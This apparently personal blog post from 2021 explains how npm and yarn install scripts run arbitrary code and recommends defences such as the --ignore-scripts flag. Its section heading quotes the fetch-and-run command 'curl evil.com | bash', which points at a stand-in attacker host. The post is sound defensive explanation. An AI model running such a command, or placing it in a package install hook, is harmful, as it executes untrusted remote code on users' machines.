---
layout: post
title: npm install is curl | bash
date: 2021-09-08T17:44:24.153Z
---
Today, GitHub published [a write-up on a number of CVEs](https://github.blog/2021-09-08-github-security-update-vulnerabilities-tar-npmcli-arborist/)[^1] in the npm packages `tar` and `@npmcli/arborist`. In their own words, 

> The npm CLI aims to enforce certain security boundaries on package installation. One of these boundaries is that a package’s contents will only be written to the appropriate folder within the `node_modules` directory hierarchy. Several of the `tar` and `@npmcli/arborist` vulnerabilities will cross that security boundary and may result in unexpected arbitrary file overwrites and subsequent code execution when installing untrusted packages.

This sounds pretty scary: "arbitrary file overwrites and subsequent code execution" is the kind of phrase that you don't want to see in a CVE description. The problem is that by default, npm allows this to happen anyway.

## postinstall: "curl evil.com | bash"

npm (and yarn) will execute arbitrary code when you install a package via [install scripts](https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install). A valid use-case is to build native code on installation, or do some other environment-specific setup, though these scripts have also been used to [show ads](https://www.zdnet.com/article/npm-bans-terminal-ads/) and, of course, as an [attack](https://blog.sonatype.com/bladabindi-njrat-rat-in-jdb.js-npm-malware) [vector](https://snyk.io/blog/npm-security-malicious-code-in-oss-npm-packages/). In fact, install scripts [were the most popular route for malware](https://blog.npmjs.org/post/188385634100/npm-security-insights-api-preview-part-2-malware) as of 2019[^2].

Installing a single malicious package is enough to get reasonably pwned. The risk is mitigated by npm’s moderation of the registry — they’re quick to remove malware once discovered. This works pretty well, though I worry about the day someone uses this to [publish a self-replicating worm](https://blog.npmjs.org/post/141702881055/package-install-scripts-vulnerability).

This attack vector isn’t unique to npm. Other package managers like pip and RubyGems allow for the same thing. As developers, we’re not as cautious when installing packages from these registries as when we use `curl | bash`, though we should be[^3].

## Mitigations

When installing an untrusted package, run `npm install` or `yarn add` with the `--ignore-scripts` flag. If, like me, you tend to forget this, you can set npm/yarn to never run scripts with `{npm,yarn} config set ignore-scripts true`.

I also recommend inspecting the source code of a package before you install it. I like to use [xray.computer](https://xray.computer/source) for this, because I made it.

And, of course, update your npm CLI to fix the CVEs that let packages bypass this setting.

[^1]: Specifically, CVE-2021-32803, CVE-2021-32804, CVE-2021-37701, CVE-2021-37712, CVE-2021-37713, CVE-2021-39134, and CVE-2021-39135.

[^2]: No more recent data is available, and work on npm’s Security Insights API/malware database seems to have stalled.

[^3]: You do get the added security feature of integrity checking when installing via a package manager as opposed to `curl | bash`. This prevents e.g. MITM attacks, but don’t forget that packages in open-source registries are mostly trash, with the occasional piece of malware or genuinely useful code floating around.